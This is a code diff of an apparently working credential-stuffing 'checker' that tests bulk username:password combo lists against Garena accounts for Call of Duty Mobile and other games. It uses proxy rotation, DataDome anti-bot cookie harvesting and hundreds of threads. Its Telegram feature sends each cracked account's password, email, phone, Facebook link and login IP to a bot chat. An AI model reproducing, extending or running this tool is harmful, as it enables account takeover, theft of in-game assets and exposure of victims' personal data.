+    n_tot = max(stats['not_clean'], 1)
+
+    for rng in ['351-400', '201-350', '101-200', '1-100']:
+        cc = clean_lvl.get(rng, 0)
+        nc = nc_lvl.get(rng, 0)
+        c_bar = f"[green]{'█' * int((cc/c_tot)*15)}[/green]"
+        n_bar = f"[yellow]{'█' * int((nc/n_tot)*15)}[/yellow]"
+        level_table.add_row(f"Level {rng}", str(cc), c_bar, str(nc), n_bar)
+
+    level_panel = Panel(level_table, title="🌍 [italic cyan]Level Distribution[/italic cyan]", border_style="cyan", expand=False)
+
+    console.print("\n")
+    console.print(Padding(overview_panel, (0, 0, 0, 4)))
+    console.print(Padding(status_panel, (0, 0, 0, 4)))
+    console.print(Padding(level_panel, (0, 0, 0, 4)))
+
+    hs = stats.get('highest_shell', 0)
+    hs_c = "yellow" if hs > 0 else "dim"
+    peak_text = Text.from_markup(f"[dim]▲ Top Clean Lv:[/dim] [green]{stats['highest_clean_level']}[/green]   [dim]▲ Top NC Lv:[/dim] [yellow]{getattr(live_stats, 'highest_not_clean_level', 0)}[/yellow]   [dim]◆ Peak Shell:[/dim] [{hs_c}]{hs:,}[/{hs_c}]")
+    console.print(Padding(peak_text, (1, 0, 1, 6)))
+
+    gc = stats.get('game_counts', {})
+    active_games = [(label, gc.get(key, 0)) for key, label in GAME_DISPLAY_NAMES if gc.get(key, 0) > 0]
+    if active_games:
+        games_table = Table(box=box.SIMPLE_HEAVY, border_style="bright_cyan", show_header=False)
+        games_table.add_column("Game", style="dim")
+        games_table.add_column("Count", style="cyan bold")
+        for label, count in active_games:
+            games_table.add_row(label, str(count))
+        games_panel = Panel(games_table, title="🎮 [italic color(139)]Games Found[/italic color(139)]", border_style="color(139)", expand=False)
+        console.print(Padding(games_panel, (0, 0, 0, 4)))
+
+    console.print(Padding(Text.from_markup("[cyan]◈  Powered by @dvlist[/cyan]"), (1, 0, 1, 6)))
+
+
+def bulk_check(bulk_mode: str = 'full'):
+    global _BULK_MODE
+    _BULK_MODE = bulk_mode
+    clear_screen()
+    display_banner()
+    file_manager = AccountFileManager()
+    file_viewer = AccountFileViewer()
+    combo_files = file_manager.scan_combo_folder()
+    if not combo_files:
+        _log('ERROR', "No combo files found in 'Combo' folder. Add .txt files and retry.")
+        return
+    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
+    if not file_infos:
+        _log('ERROR', 'No valid combo files found.')
+        return
+    file_viewer.display_file_table(file_infos)
+    selected_file = file_viewer.prompt_file_selection(file_infos)
+    if file_viewer.prompt_clean_file():
+        with console.status('[cyan]  ↺  Cleaning file encoding…[/cyan]', spinner='dots'):
+            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
+        _log('SUCCESS', f'Cleaned: [bold]{valid_count}[/bold] valid, [bright_red]{invalid_count}[/bright_red] removed')
+    if file_viewer.prompt_remove_duplicates():
+        with console.status('[cyan]  ↺  Removing duplicates…[/cyan]', spinner='dots'):
+            removed = file_manager.clean_duplicates(selected_file)
+        _log('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
+    auto_remove = file_viewer.prompt_auto_remove_checked()
+    if auto_remove:
+        _log('INFO', '[dim]Auto-remove enabled.[/dim]')
+
+    global HARVEST_COOKIES
+    _prompt_box('[white]Harvest datadome cookies while checking? (y/N)[/white]',
+                '❯ Cookie Harvest', border='bright_cyan')
+    HARVEST_COOKIES = input("    ❯ ").strip().lower() == 'y'
+    if HARVEST_COOKIES:
+        _log('SUCCESS', 'Cookie harvesting enabled.', '    ')
+
+    prompt_proxy_setup()
+    if not proxy_manager or not proxy_manager.enabled:
+        _log('INFO', '[dim]Running without proxies (direct connection)[/dim]')
+    else:
+        _log('SUCCESS', f'[dim]Proxy enabled — {len(proxy_manager.proxies)} proxies loaded[/dim]')
+    clear_screen()
+    display_banner()
+    accounts = []
     try:
-        parsed = urllib.parse.urlparse(url)
+        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
+            for line in file:
+                account, password = clean_account_line(line)
+                if account and password:
+                    accounts.append(f'{account}:{password}')
+        file_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
+        file_table.add_column(style='dim', width=12, no_wrap=True)
+        file_table.add_column(style='bright_white', no_wrap=True)
+        file_table.add_row('File', f'[cyan]{Path(selected_file).name}[/cyan]')
+        file_table.add_row('Accounts', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
+        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_green', box=box.ROUNDED, padding=(0, 2), expand=False, width=60))
+    except Exception:
+        _log('ERROR', 'Could not read file.')
+        return
+    if not accounts:
+        _log('ERROR', 'No valid accounts found in file.')
+        return
+    info_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
+    info_table.add_column(style='dim', width=16, no_wrap=True)
+    info_table.add_column(style='bright_white', no_wrap=True)
+    info_table.add_row('Total Queued', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
+    info_table.add_row('Status', '[bright_green]Ready[/bright_green]')
+    console.print(Panel(info_table, title='[bold bright_green]ℹ ACCOUNT QUEUE[/bold bright_green]', border_style='bright_green', box=box.ROUNDED, padding=(0, 2), expand=False, width=50))
+    results_manager = ResultsManager(selected_file)
+    cookie_manager = CookieManager()
+    datadome_manager = DataDomeManager()
+    live_stats = LiveStats()
+    live_stats.total_accounts = len(accounts)
+    using_proxy = proxy_manager and proxy_manager.enabled and len(proxy_manager.proxies) > 0
+    global _PROXIES_ACTIVE
+    _PROXIES_ACTIVE = bool(using_proxy)
+    if using_proxy:
+        _log('INFO', f'[dim]Using {len(proxy_manager.proxies)} proxies[/dim]')
+    else:
+        _log('INFO', '[dim]Direct connection (no proxies)[/dim]')
+    print()
+    max_threads = 400 if using_proxy else 100
+    print()
+    _tc_body = (f'[white]30-80[/white] [dim]direct[/dim]   '
+                f'[yellow]80-150[/yellow] [dim]balanced[/dim]   '
+                f'[bright_green]350+[/bright_green] [dim]proxy[/dim]\n'
+                f'[dim]default:[/dim] [bold white]{DEFAULT_THREADS}[/bold white]   '
+                f'[dim]max:[/dim] [bold white]{max_threads}[/bold white]')
+    _prompt_box(_tc_body, '◆ THREAD CONFIG',
+                border='bright_yellow', box_style=box.ROUNDED)
+    while True:
+        try:
+            raw = input(f"    \033[93m❯\033[0m threads 1-{max_threads} \033[2m(enter={DEFAULT_THREADS})\033[0m: ").strip()
+            num_threads = DEFAULT_THREADS if not raw else int(raw)
+            if 1 <= num_threads <= max_threads:
+                break
+            _log("ERROR", f"Enter a value between 1 and {max_threads}.")
+        except ValueError:
+            _log("ERROR", "Invalid input — enter a number.")
+    _log("SUCCESS", f"Running with {_BRT}{num_threads}{_RST} thread(s)")
+    print()
+    global CHECK_OTHER_GAMES
+    _og_body = ('[white]Check other Garena games[/white]  '
+                '[dim]AOV / ROV / Free Fire / Delta Force…[/dim]\n'
+                '[dim]Saves each game to a separate file  ·  ~1-3s/account[/dim]')
+    _prompt_box(_og_body, '◇ OTHER GAMES',
+                border='cyan', box_style=box.ROUNDED)
+    CHECK_OTHER_GAMES = input("    \033[96m❯\033[0m check other games? (y/N): ").strip().lower() == "y"
+    _log("SUCCESS" if CHECK_OTHER_GAMES else "INFO", "Will scan all Garena game connections" if CHECK_OTHER_GAMES else f"{_DIM}CODM only — skipping other game checks{_RST}")
+    print()
+    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
+    def _tg_save(token, chat_id, mode, clean_range, nc_range):
+        try:
+            import json as _j
+            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
+                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
+        except Exception:
+            pass
+    def _tg_load():
+        try:
+            import json as _j
+            if not os.path.exists(_TG_CFG_FILE):
+                return None
+            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
+                d = _j.load(_f)
+            return d if d.get('token') and d.get('chat_id') else None
+        except Exception:
+            return None
+    _saved_tg = _tg_load()
+    print()
+    _tg_body = ('[bold white]1[/bold white]  [bright_green]›[/bright_green]  Send Clean hits only\n'
+                '[bold white]2[/bold white]  [yellow]›[/yellow]  Send Not-Clean hits only\n'
+                '[bold white]3[/bold white]  [bright_cyan]›[/bright_cyan]  Send Both (clean + not-clean)\n'
+                '[bold white]4[/bold white]  [dim]›[/dim]  No Telegram (skip)')
+    _prompt_box(_tg_body, '⬡ TELEGRAM NOTIFICATION SETUP',
+                border='bright_green', box_style=box.ROUNDED)
+    tg_choice = ''
+    while tg_choice not in ('1', '2', '3', '4'):
+        tg_choice = input('    \033[92m❯\033[0m ').strip()
+    TG_ENABLED = tg_choice != '4'
+    TG_SEND_CLEAN = tg_choice in ('1', '3')
+    TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
+    TG_BOT_TOKEN = TG_CHAT_ID = ''
+    TG_LVL_MIN_CLEAN = TG_LVL_MAX_CLEAN = TG_LVL_MIN_NOTCLEAN = TG_LVL_MAX_NOTCLEAN = 0
+    TG_LVL_MAX_CLEAN = TG_LVL_MAX_NOTCLEAN = 9999
+    if TG_ENABLED:
+        print()
+        if _saved_tg:
+            _log('SUCCESS', f"Saved config found — Token: {_saved_tg['token'][:12]}…  Chat: {_saved_tg['chat_id']}")
+            print()
+            if input(f'  {_P}▸{_RST} use saved config? (Y/n): ').strip().lower() != 'n':
+                TG_BOT_TOKEN, TG_CHAT_ID = _saved_tg['token'], _saved_tg['chat_id']
+                _cr, _nr = _saved_tg.get('clean', [0, 9999]), _saved_tg.get('nc', [0, 9999])
+                TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = (_cr[0], _cr[1]) if TG_SEND_CLEAN else (0, 9999)
+                TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = (_nr[0], _nr[1]) if TG_SEND_NOTCLEAN else (0, 9999)
+                _log('SUCCESS', 'Using saved config')
+                print()
+            else:
+                _saved_tg = None
+        if not _saved_tg:
+            _P = '\033[96m'
+            TG_BOT_TOKEN = input(f'  {_P}▸{_RST} bot token: ').strip()
+            TG_CHAT_ID = input(f'  {_P}▸{_RST} chat id: ').strip()
+            if TG_SEND_CLEAN:
+                print(f'    {_DIM}clean level range — min-max (e.g. 50-400), enter = all{_RST}')
+                raw_clean = input(f'  {_P}▸{_RST} clean range: ').strip()
+                if raw_clean and '-' in raw_clean:
+                    try:
+                        parts = raw_clean.split('-')
+                        TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = int(parts[0].strip()), int(parts[1].strip())
+                    except Exception:
+                        pass
+            if TG_SEND_NOTCLEAN:
+                print(f'    {_DIM}not-clean level range — min-max (e.g. 1-200), enter = all{_RST}')
+                raw_nc = input(f'  {_P}▸{_RST} nc range: ').strip()
+                if raw_nc and '-' in raw_nc:
+                    try:
+                        parts = raw_nc.split('-')
+                        TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = int(parts[0].strip()), int(parts[1].strip())
+                    except Exception:
+                        pass
+            if TG_BOT_TOKEN and TG_CHAT_ID:
+                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
+                print(f'  {_DIM}Config saved for next time.{_RST}')
+        print()
+        print(f'  {_GN}✔  Telegram configured.{_RST}')
+        if TG_SEND_CLEAN:
+            print(f'  {_DIM}Clean hits  : Level {_GN}{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}{_RST}')
+        if TG_SEND_NOTCLEAN:
+            print(f'  {_DIM}Not-clean   : Level {_RD}{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}{_RST}')
+        print()
+    def _send_tg(token, chat_id, text, silent=False):
+        try:
+            import requests as _req
+            html_text = f'<pre><code>{text}</code></pre>'
+            payload = {'chat_id': chat_id, 'text': html_text, 'parse_mode': 'HTML', 'disable_notification': silent}
+            _req.post(f'https://api.telegram.org/bot{token}/sendMessage', json=payload, timeout=8)
+        except Exception:
+            pass
+    def _build_tg_message(acc, pwd, ad, is_clean_hit):
+        lvl = ad.get('codm_level', 0)
+        region = ad.get('codm_region', 'N/A')
+        nick = ad.get('codm_nickname', 'N/A')
+        uid = ad.get('uid', 'N/A')
+        country = ad.get('country', 'N/A')
+        fb = ad.get('fb_info', 'N/A')
+        fb_link = ad.get('fb_link', 'N/A')
+        fb_username = ad.get('fb_username', 'N/A')
+        shell = ad.get('shell_balance', 0)
+        email_d = ad.get('email_display', 'N/A')
+        mobile = ad.get('formatted_mobile', 'N/A')
+        login_d = ad.get('last_login_date', 'N/A')
+        login_w = ad.get('last_login_where', 'N/A')
+        login_ip = ad.get('last_login_ip', 'N/A')
+        login_country = ad.get('last_login_country', 'N/A')
+        username = ad.get('username', 'N/A')
+        nickname = ad.get('nickname', 'N/A')
+        bind_status = ad.get('bind_status', 'N/A')
+        game_connections = ad.get('game_connections', [])
+        tag = '✔ CLEAN' if is_clean_hit else '⊘ NOT CLEAN'
+        lines = [f"{'✔ CLEAN HIT' if is_clean_hit else '⊘ NOT CLEAN HIT'}", f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Account : {acc} : {pwd}', f'Status  : {tag}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Username    : {username}', f'Nickname    : {nickname}', f'UID         : {uid}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Email       : {email_d}', f'Mobile      : {mobile}', f'Facebook    : {fb}', f'FB Username : {fb_username}']
+        if fb_link != 'N/A':
+            lines.append(f'FB Link     : {fb_link}')
+        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Shells      : {shell:,}', f'Bind Status : {bind_status}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'CODM Level  : {lvl}', f'CODM Region : {region}', f'CODM IGN    : {nick}', f'CODM UID    : {ad.get("codm_uid", "N/A")}', f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'Country     : {country}', f'Last Login  : {login_d}', f'Login Via   : {login_w}', f'Login IP    : {login_ip}', f'Login Loc   : {login_country}'])
+        if game_connections and CHECK_OTHER_GAMES:
+            lines.append(f'━━━━━━━━━━━━━━━━━━━━━━━━━━')
+            lines.append(f'Game Connections:')
+            for g in game_connections:
+                gname = g.get('game', 'Unknown')
+                grole = g.get('role', 'N/A')
+                gregion = g.get('region', '')
+                lines.append(f'• {gname}: {grole} ({gregion})' if gregion else f'• {gname}: {grole}')
+        lines.extend([f'━━━━━━━━━━━━━━━━━━━━━━━━━━', f'✦  Powered by: @anon  ✦'])
+        return '\n'.join(lines)
+    def _maybe_send_tg(account_data):
+        if account_data.get('is_error') or not account_data.get('has_codm'):
+            return
+        is_clean = account_data.get('is_clean', False)
+        lvl = account_data.get('codm_level', 0)
+        acc = account_data.get('account', '')
+        pwd = account_data.get('password', '')
+        msg = _build_tg_message(acc, pwd, account_data, is_clean)
+        if TG_ENABLED:
+            if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
+                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
+            elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
+                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
+    global _TG_HOOK
+    _TG_HOOK = _maybe_send_tg
+    # ── Display mode: live feed handles results, dashboard only ─────
+    global _DISPLAY_MODE
+    _DISPLAY_MODE = 'dashboard'
+    clear_screen()
+    dashboard = BulkLiveDashboard(len(accounts), max_threads=num_threads)
+    globals()['_dashboard_ref'] = dashboard
+    dashboard.start()
+    overall_done = 0
+    account_index_counter = [0]
+    index_lock = threading.Lock()
+    stats_lock = threading.Lock()
+    # rriell-style: no deferred queue. IP_BLOCKED pauses on the shared event
+    # inside wait_for_ip_change; on timeout the account is recorded as an error
+    # and the run continues (never gets stuck).
+    _requeue = deque()          # kept for the pool-loop drain guard
+    requeue_lock = threading.Lock()
+    global _suppress_ip_prints, _ip_block_callback
+    _suppress_ip_prints = True
+    def _ip_block_cb(blocked: bool):
+        try:
+            dashboard.set_ip_blocked(blocked)
+        except Exception:
+            pass
+    _ip_block_callback = _ip_block_cb
+    _thread_local = threading.local()
+    def _get_thread_resources():
+        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
+            _thread_local.session = _make_session()
+            _thread_local.datadome = DataDomeManager()
+            _thread_local.proxy_url = None
+            _thread_local.proxy_line = None
+            if using_proxy and proxy_manager and proxy_manager.enabled:
+                proxy = proxy_manager.get_next()
+                if proxy:
+                    _thread_local.session.proxies.update(proxy)
+                    _thread_local.proxy_url = proxy.get('http') or proxy.get('https')
+                    _thread_local.proxy_line = proxy_manager._index
+                    dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
+            proxy_dict = dict(_thread_local.session.proxies) if using_proxy and proxy_manager and proxy_manager.enabled else None
+            picked_ck = cookie_manager.pick_cookie()
+            if picked_ck:
+                applyck(_thread_local.session, picked_ck)
+                dd = extract_datadome_token(picked_ck)
+                if dd:
+                    _thread_local.datadome.set_datadome(dd)
+                    _thread_local.datadome.set_session_datadome(_thread_local.session, dd)
+            else:
+                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
+                if dd:
+                    _thread_local.datadome.set_datadome(dd)
+                    _thread_local.datadome.set_session_datadome(_thread_local.session, dd)
+        return (_thread_local.session, _thread_local.datadome)
+    def _worker(account_line):
+        if ':' not in account_line:
+            return ('DONE', account_line, {})
+        try:
+            account, password = account_line.split(':', 1)
+            account, password = account.strip(), password.strip()
+            session, datadome_mgr = _get_thread_resources()
+            suppress = (_BULK_MODE != 'full')
+            status = processaccount(session, account, password, cookie_manager, datadome_mgr, live_stats, results_manager, file_manager, selected_file, auto_remove, suppress_print=suppress, proxy_manager=proxy_manager if using_proxy else None, defer_transient=True)
+            return (status, account, {})
+        except Exception:
+            return ('ERROR', account_line, {})
+    def _wrapped_worker(account_line):
+        nonlocal overall_done
+        with index_lock:
+            account_index_counter[0] += 1
+            my_index = account_index_counter[0]
+        acc_name = account_line.split(':', 1)[0].strip() if ':' in account_line else account_line
+        try:
+            dashboard.record_start(my_index, acc_name)
+        except Exception:
+            pass
+        def _record_error(reason):
+            # Terminal record for an account we gave up on — counted in live_stats
+            # AND saved to Results so it's never silently dropped. Left in the combo
+            # file (not auto-removed) since it was never actually verified.
+            nonlocal overall_done
+            acc, _sep, pwd = account_line.partition(':')
+            try:
+                live_stats.update_stats(is_error=True)
+                live_stats.push_result(success=False, error_reason=reason)
+                results_manager.add_account({'account': acc.strip(), 'password': pwd.strip(),
+                                             'is_error': True, 'error_reason': reason})
+            except Exception:
+                pass
+            dashboard.record(my_index, acc_name, success=False, error_reason=reason)
+            with stats_lock:
+                overall_done += 1
+        ip_change_tries = 0
+        while True:
+            status, acc_name, _ = _worker(account_line)
+            if status == 'IP_BLOCKED':
+                # Silently skip — don't add to feed, don't count as error.
+                # Account stays in combo file for a re-run.
+                with stats_lock:
+                    overall_done += 1
+                return
+            if status == 'IP_CHANGED':
+                ip_change_tries += 1
+                # Safety cap so a stuck IP can't spin forever — same silent skip.
+                if ip_change_tries > 3:
+                    with stats_lock:
+                        overall_done += 1
+                    return
+                if hasattr(_thread_local, 'session'):
+                    try:
+                        _thread_local.session.close()
+                    except Exception:
+                        pass
+                    del _thread_local.session
+                if hasattr(_thread_local, 'datadome'):
+                    del _thread_local.datadome
+                if using_proxy and proxy_manager and proxy_manager.enabled:
+                    proxy = proxy_manager.get_next()
+                    if proxy:
+                        proxy_url = proxy.get('http') or proxy.get('https')
+                        proxy_line = proxy_manager._index
+                        dashboard.set_current_proxy(proxy=proxy_url, line=proxy_line)
+                time.sleep(0.5)
+                continue
+            break
+        result_info = live_stats.pop_result()
+        if result_info and result_info['success']:
+            shell_balance = result_info.get('shell_balance', 0)
+            dashboard.record(my_index, acc_name, success=True, is_clean=result_info['is_clean'], has_codm=result_info['has_codm'], codm_level=result_info['codm_level'], shell_balance=shell_balance)
+        else:
+            dashboard.record(my_index, acc_name, success=False, error_reason=(result_info or {}).get('error_reason', 'Invalid'))
+        with stats_lock:
+            overall_done += 1
+    try:
+        # Stream-batch futures: keep at most 4× thread count in flight at
+        # any time. This avoids the memory churn of submitting 100k+ Future
+        # objects upfront, and lets the executor focus on actual work.
+        _IN_FLIGHT = num_threads * 4
+        with ThreadPoolExecutor(max_workers=num_threads) as executor:
+            pending = set()
+            acc_iter = iter(accounts)
+            def _next_line():
+                # Requeued (transient-failed) accounts take priority, then the
+                # fresh stream. None means nothing left to submit right now.
+                with requeue_lock:
+                    if _requeue:
+                        return _requeue.popleft()
+                try:
+                    return next(acc_iter)
+                except StopIteration:
+                    return None
+            # Prime the queue
+            for _ in range(min(_IN_FLIGHT, len(accounts))):
+                ln = _next_line()
+                if ln is None:
+                    break
+                pending.add(executor.submit(_wrapped_worker, ln))
+
+            # Keep going while work is in flight OR waiting to be requeued.
+            while pending or _requeue:
+                # Wait for at least one to complete, drain finished ones
+                from concurrent.futures import wait, FIRST_COMPLETED
+                done, pending = wait(pending, return_when=FIRST_COMPLETED, timeout=0.05)
+                # Re-fill the in-flight window
+                while len(pending) < _IN_FLIGHT:
+                    ln = _next_line()
+                    if ln is None:
+                        break
+                    pending.add(executor.submit(_wrapped_worker, ln))
+                # Reap results so exceptions don't get lost
+                for fut in done:
+                    try:
+                        fut.result()
+                    except Exception:
+                        with stats_lock:
+                            overall_done += 1
+    except KeyboardInterrupt:
+        _log('WARNING', 'Interrupted — shutting down...')
+    finally:
+        dashboard.stop()
+    _suppress_ip_prints = False
+    _ip_block_callback = None
+    print()
+    _display_final_summary(live_stats)
+    _flush_auto_remove(file_manager, selected_file, force=True)
+    print(f'  {_DIM}Results saved in real-time to Results/{_RST}')
+    print()
+    input(f'  {_DIM}↵ menu{_RST} ')
+
+def single_check():
+    clear_screen()
+    display_banner()
+    console = Console()
+    
+    console.print(Panel(
+        Text("SINGLE CHECK", style="bold bright_white"),
+        border_style="bright_cyan",
+        box=box.ROUNDED,
+        expand=False
+    ))
+    print()
+    
+    cookie_manager = CookieManager()
+    datadome_manager = DataDomeManager()
+
+    global _PROXIES_ACTIVE
+    _PROXIES_ACTIVE = False
+
+    while True:
+        global CHECK_OTHER_GAMES
+        check_games = input(f'  {_CY}◇{_RST}  Check game connections? (y/N) {_CY}❯{_RST} ').strip().lower() == "y"
+        
+        if check_games:
+            CHECK_OTHER_GAMES = True
+            _log('INFO', '[dim]Will scan all Garena game connections[/dim]')
+        else:
+            CHECK_OTHER_GAMES = False
+            _log('INFO', '[dim]CODM only — skipping other game checks[/dim]')
+        
+        print()
+        
+        live_stats = LiveStats()
+        live_stats.total_accounts = 1
+        
+        session = _make_session()
+        cookie_manager = CookieManager()
+        datadome_manager = DataDomeManager()
+        
+        picked_ck = cookie_manager.pick_cookie()
+        if picked_ck:
+            applyck(session, picked_ck)
+            dd = extract_datadome_token(picked_ck)
+            if dd:
+                datadome_manager.set_datadome(dd)
+                datadome_manager.set_session_datadome(session, dd)
+        else:
+            proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
+            datadome = get_datadome_cookie(session, proxies=proxy_dict)
+            if datadome:
+                datadome_manager.set_datadome(datadome)
+                datadome_manager.set_session_datadome(session, datadome)
+        
+        account = input(f'  {_CY}❯ Username/Email{_RST}  {_CY}❯{_RST} ').strip()
+        if not account:
+            _log('ERROR', 'Username/Email cannot be empty.')
+            print()
+            continue
+        
+        password = input(f'  {_CY}❯ Password{_RST}  {_CY}❯{_RST} ').strip()
+        if not password:
+            _log('ERROR', 'Password cannot be empty.')
+            print()
+            continue
+        
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        results_manager = ResultsManager(combo_file_path=Path('SingleCheck'), create_dirs=False)
+        results_manager.base_dir = Path(f'Single Check Output/{timestamp}')
+        
+        if CHECK_OTHER_GAMES:
+            (results_manager.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
+        
+        _log('INFO', f'[dim]Checking: [bold cyan]{account}[/bold cyan]…[/dim]')
+        print()
+        
+        processaccount(
+            session,
+            account,
+            password,
+            cookie_manager,
+            datadome_manager,
+            live_stats,
+            results_manager,
+            file_manager=None,
+            combo_file_path=None,
+            auto_remove=False,
+            use_elegant_display=True,
+            suppress_print=False
+        )
+        
+        console.print(Panel(
+            Text("SAVE RESULT?", style="bold bright_white") + Text(" (y/n)", style="dim"),
+            border_style="bright_yellow",
+            box=box.ROUNDED,
+            expand=False
+        ))
+        save_response = input(f'\n  {_YL}❯{_RST} ').strip().lower()
+        
+        if save_response == 'y':
+            for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
+                (results_manager.base_dir / sub).mkdir(parents=True, exist_ok=True)
+            _log('SAVE', f'Saved to [cyan]{results_manager.base_dir}[/cyan]')
+        else:
+            _log('INFO', '[dim]Result discarded — not saved.[/dim]')
+        
+        console.print(Panel(
+            Text("CHECK ANOTHER?", style="bold bright_white") + Text(" (y/n)", style="dim"),
+            border_style="bright_cyan",
+            box=box.ROUNDED,
+            expand=False
+        ))
+        continue_response = input(f'\n  {_MG}❯{_RST} ').strip().lower()
+        
+        if continue_response != 'y':
+            break
+        
+        session.close()
+        # [suppressed] session refresh log
+        time.sleep(1)
+        clear_screen()
+        display_banner()
+        console.print(Panel(
+            Text("SINGLE ACCOUNT CHECK", style="bold bright_white"),
+            border_style="bright_cyan",
+            box=box.ROUNDED,
+            expand=False
+        ))
+        print()
+
+def _probe_proxy_chain(proxy_url, timeout=15.0):
+    import ssl as _ssl
+    try:
+        parsed = urllib.parse.urlparse(proxy_url)
         host = parsed.hostname or ""
         port = parsed.port or 8080
         if not host:
@@ -4049,23 +4922,23 @@ def reach(url, edge=15.0):
     except Exception:
         return (False, "parse_err", -1.0)
 
-    auth = None
+    auth_hdr = None
     if user:
         creds = f"{user}:{pw}".encode()
-        auth = "Basic " + base64.b64encode(creds).decode()
+        auth_hdr = "Basic " + base64.b64encode(creds).decode()
 
     try:
         t0 = time.monotonic()
-        sock = socket.create_connection((host, port), timeout=edge)
-        sock.settimeout(edge)
+        sock = socket.create_connection((host, port), timeout=timeout)
+        sock.settimeout(timeout)
 
         req = [
             "CONNECT sso.garena.com:443 HTTP/1.1",
             "Host: sso.garena.com:443",
             "Proxy-Connection: keep-alive",
         ]
-        if auth:
-            req.append(f"Proxy-Authorization: {auth}")
+        if auth_hdr:
+            req.append(f"Proxy-Authorization: {auth_hdr}")
         sock.sendall(("\r\n".join(req) + "\r\n\r\n").encode())
 
         data = b""
@@ -4077,11 +4950,7 @@ def reach(url, edge=15.0):
 
         status_line = data.decode(errors="replace").split("\r\n", 1)[0]
         parts = status_line.split(" ", 2)
-        code = (
-            int(parts[1])
-            if len(parts) >= 2 and parts[1].isdigit()
-            else 0
-        )
+        code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
 
         if code != 200:
             try:
@@ -4094,14 +4963,11 @@ def reach(url, edge=15.0):
                 return (False, f"auth_denied({code})", -1.0)
             return (False, f"connect_{code}", -1.0)
 
-        layer = sslmod.create_default_context()
-        tls = layer.wrap_socket(sock, server_hostname="sso.garena.com")
-        tls.settimeout(edge)
+        ctx = _ssl.create_default_context()
+        tls = ctx.wrap_socket(sock, server_hostname="sso.garena.com")
+        tls.settimeout(timeout)
 
-        tls.sendall(
-            b"GET / HTTP/1.1\r\nHost: sso.garena.com\r\n"
-            b"Connection: close\r\nUser-Agent: probe\r\n\r\n"
-        )
+        tls.sendall(b"GET / HTTP/1.1\r\nHost: sso.garena.com\r\nConnection: close\r\nUser-Agent: probe\r\n\r\n")
         resp = b""
         try:
             while True:
@@ -4131,1494 +4997,46 @@ def reach(url, edge=15.0):
     except Exception as e:
         return (False, type(e).__name__, -1.0)
 
-def vessel():
-    if not hasattr(localp, "sock"):
-        s = requests.Session()
-        adapter = requests.adapters.HTTPAdapter(
-            pool_connections=1,
-            pool_maxsize=1,
-            max_retries=0,
-            pool_block=False
-        )
-        s.mount("http://", adapter)
-        s.mount("https://", adapter)
-        localp.sock = s
-    return localp.sock
 
-def discard():
-    if hasattr(localp, "sock"):
-        try:
-            localp.sock.close()
-        except Exception:
-            pass
-        del localp.sock
-
-def herd(urls: list, edge: float = 5.0, hands: int = 500, lead: str = "    ") -> list:
-    whole = len(urls)
-    workers = min(hands, max(whole, 1))
-    alive = []
-    dead = []
-    waits = []
-    bolt = threading.Lock()
-    started = time.monotonic()
-
-    meter = Progress(
-        SpinnerColumn(),
-        TextColumn("[bold bright_cyan]Validating"),
-        BarColumn(bar_width=30),
-        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
-        MofNCompleteColumn(),
-        TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"),
-        TimeElapsedColumn(),
-        TextColumn("ETA"),
-        TimeRemainingColumn(),
-        console=console,
-        refresh_per_second=12
-    )
-
-    with meter:
-        job = meter.add_task(
-            "Validating",
-            total=whole,
-            valid=0,
-            invalid=0
-        )
-
-        def scan(url: str):
-            ok, _, lat = grade(url, edge=edge)
-            with bolt:
-                if ok:
-                    alive.append(url)
-                    if lat > 0:
-                        waits.append(lat)
-                else:
-                    dead.append(url)
-                meter.update(
-                    job,
-                    completed=len(alive) + len(dead),
-                    valid=len(alive),
-                    invalid=len(dead)
-                )
-
